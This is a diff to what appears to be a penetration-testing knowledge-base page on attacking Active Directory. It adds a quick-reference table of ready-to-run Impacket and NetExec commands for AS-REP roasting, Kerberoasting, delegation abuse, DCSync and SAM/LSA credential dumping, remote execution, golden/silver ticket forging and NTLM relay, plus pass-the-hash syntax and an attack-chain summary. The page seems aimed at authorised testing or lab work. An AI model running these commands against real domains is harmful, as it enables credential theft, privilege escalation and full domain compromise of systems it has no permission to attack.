@@ -17,6 +17,36 @@ Anchors: [[adcs]], [[kerberos-attacks]], [[ad-lateral-movement]], [[default-cred
 
 Read [[netexec]]'s LDAP + SMB sections before hand-rolling any AD enumeration; most steps below are one nxc flag.
 
+## Impacket quick reference (use this, don't hand-roll)
+
+Every impacket-* invocation below is a real, tested subcommand — the SAME primitive a hand-rolled
+python-ldap/socket script would reimplement worse. Look the operation up here first; full context for
+each lives in the numbered methodology step. `[[impacket]]` has the general auth-string syntax.
+
+| Operation | Command | Step |
+|---|---|---|
+| AS-REP roast (no creds, preauth-disabled users) | `impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc>` | 3 |
+| Kerberoast (any creds, person SPNs) | `impacket-GetUserSPNs <domain>/<user>:<pass> -request -dc-ip <dc>` | 3 |
+| Kerberoast, credless (AS-REP-roastable requester) | `impacket-GetUserSPNs -no-preauth <asrep_user> -usersfile <spn_users> -dc-host <dc> <domain>/` | 3 |
+| Request/cache a TGT (for `-k` ops) | `impacket-getTGT <domain>/<user>:<pass>; export KRB5CCNAME=<user>.ccache` | 6, 7 |
+| Find unconstrained/constrained/RBCD delegation | `nxc ldap <dc> -u <user> -p <pass> --find-delegation` (impacket has no single-shot equivalent) | 6 |
+| Constrained delegation w/ protocol transition | `impacket-getST -spn <spn> -impersonate <target> -dc-ip <dc> '<domain>/<user>:<pass>'` | 6 |
+| RBCD: add attacker computer | `impacket-addcomputer <domain>/<user>:<pass> -computer-name 'FAKE$' -computer-pass <pw> -dc-ip <dc>` | 6 |
+| RBCD: write the delegation | `impacket-rbcd <domain>/<user>:<pass> -delegate-to '<target>$' -delegate-from 'FAKE$' -action write -dc-ip <dc>` | 6 |
+| DCSync (NTDS, all or one account) | `impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc>` (add `-just-dc-user <name>` to scope it) | 7 |
+| Local SAM+LSA dump (local admin, no DCSync rights) | `impacket-secretsdump <domain>/<user>:<pass>@<target>` | 7 |
+| Remote exec, SYSTEM (noisy, drops a service) | `impacket-psexec <domain>/<user>:<pass>@<target>` | 8 |
+| Remote exec, semi-interactive, no disk artifact | `impacket-wmiexec <domain>/<user>:<pass>@<target>` | 8 |
+| Remote exec, AV-evasive fallback | `impacket-smbexec` / `impacket-atexec <domain>/<user>:<pass>@<target>` | 8 |
+| Read one file as admin, no exec (AV blocks output retrieval) | `impacket-smbclient <domain>/<user>:<pass>@<target> -k -no-pass -c 'get <UNC path>'` | 8 |
+| Golden/silver ticket (krbtgt / service hash held) | `impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> [-spn <service>] Administrator` | 9 |
+| NTLM relay (pair with a coercion trigger) | `impacket-ntlmrelayx -tf targets.txt -smb2support` | - |
+| Enumerate unconstrained-delegation computers | `impacket-findDelegation <domain>/<user>:<pass> -dc-ip <dc>` | 6 |
+
+Pass-the-hash: swap `<user>:<pass>` for `-hashes :<NTLM_hash> <domain>/<user>`. Pass-the-ticket: swap the
+whole auth string for `-k -no-pass` with `KRB5CCNAME` exported. Every op needs `-dc-ip <dc>` (and
+`-target-ip <dc>` for Kerberos-only ops) — see the stale-`/etc/hosts` gotcha below.
+
 ## Attack surface signals
 
 **APPROACH:** Fire the unauth-enum wave at once (null/guest shares + RID-brute, anon LDAP users + description fields, AS-REP roast, person-object SPN Kerberoast, lockout policy, `certipy find -vulnerable`), then walk enum -> roast -> ACL/ADCS ESC1-16 -> delegation -> DCSync -> lateral, reusing captured creds inside the lockout gate.
